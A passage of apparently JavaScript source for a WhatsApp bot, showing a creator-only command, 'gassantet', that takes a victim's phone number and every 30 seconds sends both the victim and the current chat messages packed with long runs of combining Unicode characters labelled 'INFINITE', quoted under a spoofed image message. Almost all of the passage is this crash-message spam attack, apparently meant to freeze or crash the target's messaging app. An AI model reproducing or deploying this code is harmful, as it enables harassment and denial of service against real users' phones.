𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
        case 'gassantet': {          
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
